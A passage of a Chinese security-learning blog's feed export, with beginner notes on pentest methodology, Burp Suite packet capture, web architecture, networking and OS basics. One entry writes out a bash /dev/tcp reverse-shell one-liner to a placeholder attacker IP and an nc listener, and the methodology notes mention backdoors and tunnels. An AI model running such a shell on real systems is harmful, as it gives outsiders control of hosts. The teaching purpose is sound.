。接下来，审计人员就可以根据其所拥有的访问权限，在被测系统中自由发挥。审计人员也可以使用适用于目标系统的本地漏洞来<strong>提升自己的权限</strong>。只要他们能够在目标系统上运行提权漏洞利用程序，就可以获得主机的超级用户权限或者系统级权限。工程师还可以<strong>以该主机为跳板</strong>，进一步<strong>攻击局域网络</strong>。<strong>根据之前渗透范围的界定（授权），审计人员接下来会开展的攻击可能是受限制的，也可能是不受限制。</strong>然后，他们很有可能个以各种方式获得与控制系统有关的更多信息。具体的说，他们可能是用嗅探手段截获网络数据包，破解各种服务的密码，在局域网络中使用网络欺骗手段。所以说，提升权限的最终目的是获得目标系统的最高访问权限。</p><h3 id="访问维护"><a href="#访问维护" class="headerlink" title="访问维护"></a>访问维护</h3><p>多数情况下，审计人员需要在一段时间内维护他们对目标系统的访问权限。例如，在演示越权访问目标系统的时候，安装后门将节省重新渗透目标系统所耗费的大量时间。这种情况下，访问维护将节约获取目标系统访问权限所需要的时间、花费和资源。审计人员可以通过一些秘密的通信隧道，在既定时间内维持对目标的访问权限。这些隧道往往基于特定协议、代理或者点对点方法的后门程序。这种对系统的访问方法可以清楚地展示，入侵人员在目标系统实施攻击时隐藏行踪的具体方法。</p><ul><li>埋藏后门</li><li>隧道技术</li></ul><h2 id="文档报告"><a href="#文档报告" class="headerlink" title="文档报告"></a>文档报告</h2><p>在渗透测试的最后一个环节里，审计人员要记录、报告并现场演示那些已经识别、验证和利用了的安全漏洞。在被测单位的管理和技术团队会检查渗透时使用的方法，并会根据这些文档修补所有存在的安全漏洞。所以从道德角度来看，文档报告的工作十分重要。为了帮助管理人员和技术人员共同理解、分析当前IT 基础架构中的薄弱环节，可能需要给不同的部门撰写不同措辞的书面报告。</p><h3 id="具体内容及涉及方法"><a href="#具体内容及涉及方法" class="headerlink" title="具体内容及涉及方法"></a>具体内容及涉及方法</h3><p><strong>收集域名信息</strong></p><p>需要收集的信息：</p><ul><li>目标域名</li><li>子域名</li><li>Whois信息</li></ul><p>对应的方法：</p><ul><li>域名解析</li><li>子域名爆破</li><li>Whois查询</li><li>收集IP地址信息</li><li>需要收集的信息：</li></ul><p><strong>Web应用程序所在的IP地址</strong></p><p>对应的方法：</p><ul><li>Ping命令</li><li>traceroute命令</li><li>端口扫描</li><li>收集Web服务器信息</li></ul><p>需要收集的信息：</p><p><strong>Web服务器类型和版本</strong><br><strong>Web应用程序框架类型和版本</strong></p><p>对应的方法：</p><ul><li>HTTP响应头分析</li><li>Web指纹识别工具</li><li>收集Web应用程序信息</li></ul><p>需要收集的信息：</p><p><strong>Web应用程序的目录结构</strong><br><strong>Web应用程序的URL地址</strong><br><strong>Web应用程序的文件类型</strong></p><p>对应的方法：</p><ul><li>目录枚举工具</li><li>文件扫描工具</li><li>基于字典的目录扫描工具</li><li>收集Web应用程序漏洞信息</li></ul><p>需要收集的信息：</p><p><strong>SQL注入漏洞</strong><br><strong>XSS漏洞</strong><br><strong>CSRF漏洞</strong><br><strong>文件上传漏洞</strong></p><p>对应的方法：</p><ul><li>SQL注入工具</li><li>XSS漏洞扫描工具</li><li>CSRF漏洞扫描工具</li><li>文件上传漏洞测试工具</li></ul><p>参考文章：<a href="https://blog.csdn.net/qq_46567150/article/details/120710083">https://blog.csdn.net/qq_46567150/article/details/120710083</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>基础004-抓包技术</title>
+      <link href="/2023/03/16/%E5%9F%BA%E7%A1%80004-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF/"/>
+      <url>/2023/03/16/%E5%9F%BA%E7%A1%80004-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF/</url>
+      
+        <content type="html"><![CDATA[<h1 id="001-基础"><a href="#001-基础" class="headerlink" title="001-基础"></a>001-基础</h1><h2 id="抓包技术"><a href="#抓包技术" class="headerlink" title="抓包技术"></a>抓包技术</h2><h5 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h5><ul><li><strong>HTTP&#x2F;HTTPS协议</strong> ：</li></ul><p>Charles：<br>Fidder：<br>Burpsuite：</p><p>BP使用步骤：</p><ol><li><p>使用首先打开设置代理接口选项：Proxy–&gt; Options –&gt;添加监听的接口，以127.0.0.1端口是8080为例。</p></li><li><p>HTTP代理：以Firedox浏览器为例，<br>打开菜单–&gt;选项–&gt;网络代理–&gt;设置–&gt;手动配置代理<br>127.0.0.1端口是8080 与burp Proxy中的代理一致。</p></li></ol><p>手动代理：代理到本机，因为想让浏览器通过本机把流量发送到这个端口，再由burp监听到，把包拦下来（端口的选择要和burp一样）<br>HTTP代理（因为抓的是http的包）</p><p>设置完后，burp就可以抓包了。</p><ol start="3"><li>HTTPS代理：如果要抓HTTP的包要用HTTP代理<br>如果要抓HTTPS的包，要用HTTPS代理（SSL proxy）<br>HTTP默认走的是80端口，HTTPS走的是443端口。两者端口不一样，要代理HTTPS就一定要用SSL去代理</li></ol><p>设置完代理就可以了吗？不行<br>HTTPS（S表示security），多添加了一套SSL层（在TCP和HTTP中间），作加密的。<br>burp suite有一个证书：<a href="http://burp/%EF%BC%88%E8%BE%93%E5%85%A5%E7%9A%84%E6%98%AFhttp%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%80%E5%AE%9A%E8%A6%81%E4%BB%A3%E7%90%86http">http://burp/（输入的是http，所以一定要代理http</a> 才可以访问http的网站，代理的是https就可以访问https的网站）<br>访问 <a href="http://burp/">http://burp/</a> 下载证书，导入到浏览器的证书管理器中。<br>这个证书的名字叫PortSwigger CA<br>导入后弹出的弹框（选第一个也行，都选中也行）<br>导入这个证书就可以解密https协议里面的乱码数据了。</p><ul><li><strong>其他协议</strong> ：</li></ul><p>科来:<br>TCPDump:<br>Wireshark:</p><p><strong>代理：</strong> 代理也称网络代理，是一种特殊的网络服务。它允许客户端通过这个服务与服务器进行连接。简单的来说，可以把代理理解为一种网络中间商。</p><p><strong>正常情况下：</strong> 我们去访问一个网站，应该是直连的情况，手机&#x2F;电脑访问目标网站-&gt;目标网站正常显示，</p><p>这种情况，需要建立在你的网络正常，没有任何限制的基础上才能完成的。</p><p>比如我们在家里使用QQ，玩LOL、PUBG，看爱奇艺，逛淘宝，查百度等等，这些都是这种直连模式</p><p><strong>那还有一些比较特殊的情况：</strong> 比如公司内部采用了局域网模式，限制了公司内部直接访问外网的权限，但是呢，你在某些情况下需要去访问外网，那怎么办呢？</p><p>我们就可以采取非直连的模式，即，手机&#x2F;电脑访问目标网站-&gt;代理服务器-&gt;目标网站正常。<br>这种情况，就是我们在本地发送请求的时候，不是直接把请求发到服务器上的，是先把请求发给代理服务器，再由代理服务器进行转发到服务器上的。</p><p><strong>那工具使用为什么也要代理呢？</strong><br>拿fiddler举列子，fiddler是一款抓包工具，那fiddler是安装在你电脑上的，你发请求也是通过电脑去发的。那fiddler又怎么抓到请求的呢？</p><p>这里就有需要用到代理概念了，把fiddler设置为代理服务器，那么我们的请求就是先到了fiddler，再通过fiddler转发到服务器。所以fiddler就可以抓到各种数据包了。</p><h5 id="封包技术"><a href="#封包技术" class="headerlink" title="封包技术"></a>封包技术</h5><p>常用工具：WPE、封包监听工具</p><p>抓包和封包：<a href="https://blog.csdn.net/hesysd/article/details/123262977">https://blog.csdn.net/hesysd/article/details/123262977</a><br>常见网络协议HTTP&#x2F;HTTPS、TCP&#x2F;IP、UDP：<a href="https://blog.csdn.net/qq_40454863/article/details/114527665">https://blog.csdn.net/qq_40454863/article/details/114527665</a><br>BP使用教程资料：<a href="https://blog.csdn.net/Waffle666/article/details/111083913">https://blog.csdn.net/Waffle666/article/details/111083913</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>基础003-WEB应用</title>
+      <link href="/2023/03/16/%E5%9F%BA%E7%A1%80003-WEB%E5%BA%94%E7%94%A8/"/>
+      <url>/2023/03/16/%E5%9F%BA%E7%A1%80003-WEB%E5%BA%94%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="003-基础"><a href="#003-基础" class="headerlink" title="003-基础"></a>003-基础</h1><h2 id="WEB应用"><a href="#WEB应用" class="headerlink" title="WEB应用"></a>WEB应用</h2><h4 id="WEB应用环境架构可分为两种主要类型："><a href="#WEB应用环境架构可分为两种主要类型：" class="headerlink" title="WEB应用环境架构可分为两种主要类型："></a>WEB应用环境架构可分为两种主要类型：</h4><ul><li><p><strong>单层架构</strong>（Single-Tier Architecture）：所有的组件都运行在同一个主机上，比如在个人计算机上运行的简单网站。</p></li><li><p><strong>多层架构</strong>（Multi-Tier Architecture）：将不同的组件分别部署在不同的主机上，通过网络进行通信和协作，<strong>通常包括以下三层</strong>：</p></li></ul><p>a. <strong>表现层</strong>（Presentation Layer）：也称为客户端层，主要负责用户界面的展示和数据输入输出的交互，常见的表现层组件包括HTML、CSS、JavaScript等。</p><p>b. <strong>业务逻辑层</strong>（Business Logic Layer）：也称为应用层，主要负责处理业务逻辑和数据处理等操作，常见的业务逻辑层组件包括Java Servlet、ASP.NET、PHP等。</p><p>c. <strong>数据层</strong>（Data Layer）：也称为存储层，主要负责数据的存储和管理，包括关系型数据库（如MySQL、Oracle等）和非关系型数据库（如MongoDB、Redis等）等。</p><h4 id="搭建一个WEB服务"><a href="#搭建一个WEB服务" class="headerlink" title="搭建一个WEB服务"></a>搭建一个WEB服务</h4><ul><li>首先需要服务器、证书、域名、DNS解析</li><li>架构搭建：</li></ul><ol><li><p>操作系统选择 ：Windows、 linux</p></li><li><p>开发语言选择 ：ASP&#x2F;ASPX(参考asp和aspx的区别：<a href="https://www.cnblogs.com/Belling/archive/2012/10/25/2739129.html)%E3%80%81">https://www.cnblogs.com/Belling/archive/2012/10/25/2739129.html)、</a> PHP、 Java、 Python 、JavaScript …</p></li><li><p>源码 ：CMS（CMS是英语Content Management System的缩写，按英语的字面翻译就是内容管理系统，顾名思义，它主要是为了方便发布网络内容而存在的一体化Web管理系统）、框架</p></li><li><p>中间件 ：IIS（IIS的全称是Internet Information Services（互联网信息服务），是微软提供的运行在Windows系统下的中间件，主要用来解析.ASP，.ASA，.CER三种文件格式的文件。）、Apache、Nginx、Tomcat、weblogic、Jboos …</p></li><li><p>数据库类型 : Mysql、MSSQL 、Oracle 、Redis、MongoDB</p></li><li><p>第三方软件： Openssh、PHPMyAdmin</p></li></ol><p><strong>Web应用的通讯过程可以分为以下步骤：</strong></p><ol><li><p>用户发起请求：用户使用Web浏览器输入URL或点击链接，向Web服务器发起请求。</p></li><li><p>DNS解析：Web浏览器将URL中的域名发送给DNS服务器进行解析，获取相应的IP地址。</p></li><li><p>TCP连接：Web浏览器使用HTTP协议与Web服务器建立TCP连接，确保数据的可靠传输。</p></li><li><p>发送HTTP请求：Web浏览器向Web服务器发送HTTP请求，请求特定的资源（如HTML、CSS、JavaScript文件等）。</p></li><li><p>服务器处理请求：Web服务器接收到请求后，会进行相应的处理，如查询数据库、执行程序等。</p></li><li><p>发送HTTP响应：Web服务器将处理后的资源以HTTP响应的形式返回给Web浏览器。</p></li><li><p>浏览器渲染页面：Web浏览器接收到HTTP响应后，根据HTML、CSS和JavaScript等资源进行页面渲染。</p></li><li><p>断开TCP连接：Web浏览器和Web服务器之间的TCP连接被断开，请求-响应过程结束。</p></li></ol><h2 id="WEB框架"><a href="#WEB框架" class="headerlink" title="WEB框架"></a>WEB框架</h2><p><strong>简介</strong><br>web框架是用来进行Web应用开发的一个<strong>软件架构</strong>。大多数的web框架提供了一套开发和部署网站的方式。为web行为提供了一套支持的方法。使用web框架，很多业务逻辑外的功能不需要自己再取完善，而使用框架已有的功能就可以。</p><p>主要用于动态网络开发。以PHP为例、PHP可以在apache服务器上进行web开发，而不必使用框架。使用PHP进行开发的时候，在不使用框架的情况下，数据库连接就需要自己来实现，页面的生成和显示也是一样。比如<strong>框架</strong>的话<strong>可以完全避免sql注入的工作</strong>，而PHP在不用框架的情况下，这部分要自己做。</p><p>目前python主流的框架有Django和FLask；Java目前主流的开发框架是ssm。</p><h3 id="web系统相关概念"><a href="#web系统相关概念" class="headerlink" title="web系统相关概念"></a>web系统相关概念</h3><h4 id="网页、网站"><a href="#网页、网站" class="headerlink" title="网页、网站"></a>网页、网站</h4><p>我们可以通过浏览器上网看到精美页面，一般都是经过浏览器渲染过的html页面，其中包含css等前端技术。多个网页的集合就是网站</p><h4 id="Web容器"><a href="#Web容器" class="headerlink" title="Web容器"></a>Web容器</h4><p>Web容器，也叫web服务器，主要提供web服务，也就是常说的http服务。常见的Web容器有<strong>Apache&#x2F;IIS&#x2F;Nginnx</strong>等<br>注意，Nginnx除了作为Web容器外，还经常用于反向代理以及负载均衡，Nginnx性能高</p><h4 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h4><p>静态网页都是一些.html文件，都是纯文本文件。这些文件包含HTML代码。HTML在浏览器中解释运行</p><h4 id="中间件服务器"><a href="#中间件服务器" class="headerlink" title="中间件服务器"></a>中间件服务器</h4><p>以上这种，只能单向地给用户展示信息，随着web的发展，信息要双向流动，产生了交互(进行对话）的需求，也就是动态网页的概念；所谓动态就是利用flash、php、asp、java等技术在网页种嵌入一些可运行的脚本，用户浏览器在解释页面时，遇到脚本就启动运行它。</p><p>脚本的使用让web服务模式有了“双向交流”的能力，web服务模式也可以像传统软件一样进行各种事务处理，如编辑文件、利息计算、提交表单等，web架构的适用面大大扩展。</p><p>这些脚本可以嵌入在页面中，如JS等。也可以以文件的形式单独存放在web服务器的目录里，如.asp、.php、.jsp文件等。这样功能性的脚本越来越多，形成常用的工具包，单独管理，web业务开发时，直接使用就可以了，这就是中间件服务器。</p><p>传统意义上的中间件是指flash、php、asp、java等，随着互联网发展，逐渐模糊的中间件的概念，也逐渐模糊了web容器的概念，另外，中间件除了flash、php、asp、java等，常见的还有Weblogic（原是java的中间件，既能当Web容器，又能当中间件，还能做负载均衡），还有Jboss（也是java的中间件，既能当Web容器，又能当中间件）</p><p>apache调用php时有两种方法，一种是模块调用，一种是cgi调用。</p><h4 id="数据库的出现"><a href="#数据库的出现" class="headerlink" title="数据库的出现"></a>数据库的出现</h4><p>静态网页与脚本都是事前设计好的，一般不经常改动，但网站上很多内容需要经常更新，如新闻、博客文章、互动游戏等，这些变动的数据放在静态网页的程序中显然不适合，传统的方法是数据与程序分离，采用专业的数据库。web开发者在web服务器后边增加了一个数据库服务器，这些经常变化的数据存进数据库，可以随时更新。当用户请求页面时，脚本根据用户请求的页面，涉及到动态数据的地方，利用SQL数据库语言，从数据中读取最新的数据，生成“完整”页面，最后发送给用户。</p><h4 id="浏览器访问网站时，数据包流向"><a href="#浏览器访问网站时，数据包流向" class="headerlink" title="浏览器访问网站时，数据包流向"></a>浏览器访问网站时，数据包流向</h4><p>当浏览器访问一个网站时，数据包流量是如何流向的？</p><p>(1)首先进行域名解析获得网站的IP地址</p><p>在进行域名解析时</p><ul><li>首先查看本地缓存；</li><li>若没有，再查看host文件；</li><li>再没有，则再找DNS服务器，而DNS服务器是自动获取IP地址时，DHCP服务器发送给主机的或者网络配置时手动配置的</li></ul><p>（2）获得网站的IP地址后，以自己的地址为源IP地址，网站的IP地址为目标IP地址封装IP包；<br>（3）之后封装帧头帧尾，以自己的MAC地址为源MAC地址，若服务器与自己不在同一个局域网，则以网关的MAC地址为目标MAC地址，而目标MAC地址的获取通过ARP广播或ARP缓存获取。<br>（4）将数据帧发到网关后，网关进行ACL表的匹配，路由然后通过NAT将源IP的私网地址转换为公网IP地址，发送到公网上<br>（5）在公网经过层层路由后到达服务器<br>（6）访问80、443端口，<br>（7）经过3次握手之后与服务器建立连接<br>（8）给服务器发送http包<br>（9）服务器给浏览器发送http响应，响应时</p><p>如果浏览器访问的是.html文件，找到文件后直接发送过去<br>如果浏览器访问的是.php文件，将PHP进行解析，若PHP连接数据库，则查找数据库，将PHP运行结果发给浏览器。</p><h4 id="WEB方面漏洞分类"><a href="#WEB方面漏洞分类" class="headerlink" title="WEB方面漏洞分类"></a>WEB方面漏洞分类</h4><ul><li>SQL注入 </li><li>文件安全</li><li>RCE执行</li><li>XSS跨站（跨站脚本攻击）</li><li>CSRF&#x2F;SSRF&#x2F;CRLF（跨站请求伪造）</li><li>反序列化</li><li>逻辑越权</li><li>未授权访问</li><li>XXE&#x2F;XML（xml外部实体注入）</li><li>弱口令安全等（分类漏洞产生层面）</li></ul><p>漏洞分类总结：<a href="https://blog.csdn.net/weixin_44431280/article/details/122794090">https://blog.csdn.net/weixin_44431280/article/details/122794090</a><br>参考文章web框架及web系统相关概念：<a href="https://blog.csdn.net/m0_64378913/article/details/124113450">https://blog.csdn.net/m0_64378913/article/details/124113450</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>网络基础</title>
+      <link href="/2023/03/15/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
+      <url>/2023/03/15/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<h2 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h2><h3 id="1、计算机网络"><a href="#1、计算机网络" class="headerlink" title="1、计算机网络"></a>1、计算机网络</h3><p>计算机网络是由多台计算机相互连接而成的网络系统。通过计算机网络，人们可以在不同的计算机之间进行数据交换、共享资源、远程控制等操作。网络系统的基本组成部分包括网络设备（如路由器、交换机、网卡等）和通信链路（如电缆、光纤、无线信道等）。</p><h3 id="2、网络拓扑结构"><a href="#2、网络拓扑结构" class="headerlink" title="2、网络拓扑结构"></a>2、网络拓扑结构</h3><p>网络拓扑结构是指计算机网络中节点之间的物理连接方式和布局方式。常见的网络拓扑结构包括星型拓扑、总线型拓扑、环型拓扑、树型拓扑等。这些拓扑结构各有优缺点，可以根据具体需求进行选择。</p><h3 id="3、网络通信协议"><a href="#3、网络通信协议" class="headerlink" title="3、网络通信协议"></a>3、网络通信协议</h3><p>网络通信协议是指在计算机网络中，节点之间相互通信所使用的规则和标准。通信协议包括通信的格式、数据的编码方式、传输的方式、错误控制等内容。常见的网络通信协议包括TCP&#x2F;IP协议、HTTP协议、FTP协议、SMTP协议等。</p><h3 id="4、网络层次结构"><a href="#4、网络层次结构" class="headerlink" title="4、网络层次结构"></a>4、网络层次结构</h3><p>网络层次结构是指计算机网络中不同设备和协议按照不同的层次进行组织和分工。常见的网络层次结构包括OSI七层模型和TCP&#x2F;IP四层模型。在网络层次结构中，每一层都有不同的功能和任务，从而实现了网络中各种信息的传输和处理。</p><h3 id="5、网络安全"><a href="#5、网络安全" class="headerlink" title="5、网络安全"></a>5、网络安全</h3><p>网络安全是指保护计算机网络中的计算机、数据和通信线路不受未经授权的访问、破坏、窃听和干扰等威胁的一种技术。常见的网络安全技术包括防火墙、加密技术、访问控制、入侵检测等。网络安全的重要性越来越突出，特别是在企业、政府机构、金融机构等领域，网络安全已经成为重要的考虑因素。</p><ul><li><p>当我们说计算机网络时，通常指的是将多个计算机连接起来，形成一个互联互通的系统。这个系统可以用来共享资源、传递信息、进行远程操作等。</p></li><li><p>计算机网络可以根据规模的不同分为不同的类型，比如局域网、广域网、城域网等。局域网（Local Area Network，简称LAN）通常覆盖一个较小的地理范围，比如一个办公室、一个学校或者一个家庭。广域网（Wide Area Network，简称WAN）则覆盖较大的地理范围，可能跨越多个城市或者国家。城域网（Metropolitan Area Network，简称MAN）则介于局域网和广域网之间，覆盖一个城市或者一个城市的一部分。</p></li><li><p>无论是哪种类型的计算机网络，都由若干个网络设备和通信链路组成。其中，网络设备包括路由器、交换机、网卡、集线器等，用于实现不同计算机之间的互联互通。通信链路则包括电缆、光纤、无线信道等，用于传输数据。这些设备和链路构成了计算机网络的基础设施。</p></li><li><p>在计算机网络中，数据的传输是通过通信协议实现的。通信协议是一种规范，它规定了通信双方的数据交换格式、传输方式、错误控制等。通信协议可以分为多层，不同层次的协议完成不同的任务。比如，TCP&#x2F;IP协议就分为应用层、传输层、网络层和物理层四个层次。</p></li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 网络基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>基础002-操作系统</title>
+      <link href="/2023/03/15/%E5%9F%BA%E7%A1%80002-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+      <url>/2023/03/15/%E5%9F%BA%E7%A1%80002-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
+      
+        <content type="html"><![CDATA[<h1 id="002-基础"><a href="#002-基础" class="headerlink" title="002-基础"></a>002-基础</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p><strong>不同操作系统的文件下载方式：</strong></p><p><strong>1. linux文件下载</strong></p><ul><li>wget：一个命令行工具，用于从网络上下载文件。</li><li>curl：另一个命令行工具，也用于从网络上下载文件，但与wget相比，curl的功能更为强大，可以支持更多的协议和特性。</li></ul><p>在Linux操作系统中，可以使用命令行工具wget来进行文件在线下载，步骤如下：</p><p>打开终端窗口，进入要下载文件的目录。</p><p>在终端中输入命令：wget &lt;文件URL&gt;，其中&lt;文件URL&gt;是要下载文件的URL链接地址。</p><p>例如，要下载一个名为test.zip的文件，该文件的URL链接地址为<a href="https://example.com/test.zip%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%AD%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4%EF%BC%9A">https://example.com/test.zip，可以在终端中输入命令：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://example.com/test.zip</span><br></pre></td></tr></table></figure><p>，然后按下回车键开始下载。</p><p>下载完成后，可以在当前目录下找到下载的文件。<br>需要注意的是，有些文件需要登录或认证才能下载，此时可以在wget命令后添加登录信息或cookie信息，具体命令可以使用wget的帮助文档来查询。另外，如果要下载的文件比较大，可以使用wget命令的”-c”选项来实现断点续传，这样可以在下载中断后，重新开始下载，而不需要重新下载整个文件。</p><p>Windows和Mac环境下的文件安装与下载</p><p>不同操作系统上的编程语言环境搭建</p><p><strong>2. 反弹shell</strong></p><p>反弹shell（Reverse Shell）是一种攻击技术，可以让攻击者通过向目标系统发送命令来获取对目标系统的控制权限。具体来说，反弹shell的攻击过程如下：</p><ul><li><p>攻击者在自己的计算机上启动一个监听程序，监听某个端口。</p></li><li><p>攻击者在目标系统上运行一个恶意程序，该程序会与攻击者计算机上的监听程序建立连接，并将目标系统上的shell进程的控制权交给攻击者。</p></li><li><p>攻击者在自己的计算机上可以通过该连接向目标系统发送命令，获得对目标系统的完全控制。</p></li></ul><p>反弹shell的实现步骤如下：</p><p>攻击者在自己的计算机上启动一个监听程序，监听某个端口。可以使用netcat（nc）命令或其他监听工具来实现。</p><p>例如，在攻击者的计算机上运行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p>这个命令启动了一个监听程序，监听4444端口，并等待与目标系统建立连接。</p><p>在目标系统上运行一个恶意程序，该程序会与攻击者计算机上的监听程序建立连接，并将目标系统上的shell进程的控制权交给攻击者。可以使用各种漏洞或社会工程学攻击手段来诱使目标系统上的用户或进程运行恶意程序。</p><p>例如，在目标系统上运行如下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>这个命令会启动一个bash shell进程，将其标准输入和输出（stdin和stdout）重定向到一个TCP连接上，该TCP连接将与攻击者计算机上的监听程序建立连接，并将控制权交给攻击者。</p><p>攻击者在自己的计算机上可以通过该连接向目标系统发送命令，获得对目标系统的完全控制。</p><p>需要注意的是，反弹shell是一种非常危险的攻击技术，仅限于安全测试或授权的渗透测试使用。在未经授权的情况下使用反弹shell技术可能会导致法律问题。</p><p><strong>正向连接（正向shell）是指攻击者通过向目标系统发送命令，让目标系统与攻击者的计算机建立连接，从而获得对目标系统的控制权限。正向连接的实现方式比较简单，但需要攻击者知道目标系统的IP地址和端口号。</strong></p><p><strong>反向连接（反弹shell）则是指攻击者在自己的计算机上启动一个监听程序，并等待目标系统主动连接。一旦目标系统连接到攻击者计算机上的监听程序，攻击者就可以获得对目标系统的控制权限。反向连接的实现方式比正向连接复杂一些，但可以避开一些网络安全设备和防火墙的检测。</strong></p><p>总的来说，<strong>正向连接</strong>和<strong>反向连接</strong>都是获取对目标<strong>统控制权限</strong>的攻击技术。正向连接需要攻击者知道目标系统的<strong>IP地址和端口号</strong>，而反向连接则需要在目标系统上运行一个<strong>恶意程序</strong>，与攻击者计算机上的监听程序建立连接。在实际应用中，攻击者会根据具体情况选择使用哪种连接方式。</p><p><strong>3. windows中的powershell和cmd</strong></p><p><strong>CMD</strong>（Command Prompt）是Windows系统自带的命令行工具，它提供了一种使用命令行方式来操作计算机的方式，可以用于执行各种系统命令和脚本。CMD使用的是Windows的命令提示符界面，界面简单，但可用的命令比较有限。</p><p><strong>PowerShell</strong>是一种面向对象的脚本语言和命令行工具，它集成了.NET Framework和Windows管理框架（WMI），可以方便地管理Windows系统、服务、进程和事件等。与CMD不同，PowerShell使用的是一种称为PowerShell命令行界面（PowerShell Command Line Interface，简称PS CLI）的界面，支持使用命令行、脚本和GUI界面三种方式操作计算机，可用的命令和功能更加丰富和强大。</p><p>总的来说，CMD和PowerShell都是Windows系统中的命令行工具，但PowerShell比CMD更加强大和灵活，可以方便地编写复杂的脚本和管理任务。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>基础001-专业名词</title>
+      <link href="/2023/03/15/%E5%9F%BA%E7%A1%80001-%E4%B8%93%E4%B8%9A%E5%90%8D%E8%AF%8D/"/>
+      <url>/2023/03/15/%E5%9F%BA%E7%A1%80001-%E4%B8%93%E4%B8%9A%E5%90%8D%E8%AF%8D/</url>
+      
+        <content type="html"><![CDATA[<h1 id="001-基础"><a href="#001-基础" class="headerlink" title="001-基础"></a>001-基础</h1><h3 id="渗透测试方法论"><a href="#渗透测试方法论" class="headerlink" title="渗透测试方法论:"></a>渗透测试方法论:</h3><p><strong>定义：</strong><br>渗透测试（penetration testing）是实施安全评估（审计）的具体手段。方法论是在制定，实施信息安全审计方案时，需要遵循的规则、惯例和过程。人们在评估网络、应用和系统或三者组合的安全状况时，不断摸索各种务实的理念和成熟的做法，并总结了一套理论——渗透测试方法论。<br>渗透测试的对象为网络、应用和系统或三者的组合。其中，网站和APP均属于应用，网站为web应用，APP为终端应用；路由器属于网络，社工</p><h3 id="渗透测试分类："><a href="#渗透测试分类：" class="headerlink" title="渗透测试分类："></a>渗透测试分类：</h3><h4 id="黑盒测试："><a href="#黑盒测试：" class="headerlink" title="黑盒测试："></a><strong>黑盒测试：</strong></h4><p>在进行黑盒测试时，安全审计员在不清楚被测单位的内部技术构造的情况下，从外部评估网络基础设施的安全性。在渗透测试的各个阶段，黑盒测试借助真实世界的黑客技术，暴露出目标的安全问题，甚至可以揭露尚未被他人利用的安全弱点。其中，网络基础设施就包括网络、应用和系统或三者的组合。</p><p>渗透测试人员应能够理解安全弱点，将之分类并按照风险等级（高、中、低）对其进行排序。通常来说，风险等级（级别）取决于相关弱点可能形成危害的大小。老练的渗透测试专家应能够确定可引发的安全事故的所有安全模式。当渗透测试人员完成所有测试工作之后，他们会把测试对象安全状况有关的必要信息进行整理，并使用业务的语言描述这些被识别出来的风险，继而将之汇总为书面报告。黑盒测试的市场报价通常会高于白盒测试。</p><p>黑盒测试的例子：直接给一个域名，然后要求渗透测试人员进行测试，渗透测试人员首先需要进行信息收集，收集域名下有哪些资产，如有多少web应用、多少子域名、有多少服务（邮件服务、日志服务器、数据库服务）。</p><h4 id="白盒测试："><a href="#白盒测试：" class="headerlink" title="白盒测试："></a><strong>白盒测试：</strong></h4><p>白盒测试的审计员是可以获取被测单位的各种内部资料甚至不公开资料，所以渗透测试人员的视野更为开阔。若以白盒测试的方法评估安全漏洞，测试人员可以以最小的工作量达到最高的评估精确度。白盒测试从被测系统环境本身出发，全面消除内部安全问题。从而增加了从单位外部渗透系统的难度。黑盒测试起不到这样的作用。白盒测试所需要的步骤数目与黑盒测试不相上下。另外若能将白盒测试与常规的研发生命周期相结合，就可以最早的消除全部安全隐患。这使得白盒测试的时间、成本，以及发现、解决安全弱点的技术门槛都全面低于黑盒测试。</p><p>白盒测试的例子：杀毒软件、微软的自动更新。</p><h4 id="脆弱性评估与渗透测试："><a href="#脆弱性评估与渗透测试：" class="headerlink" 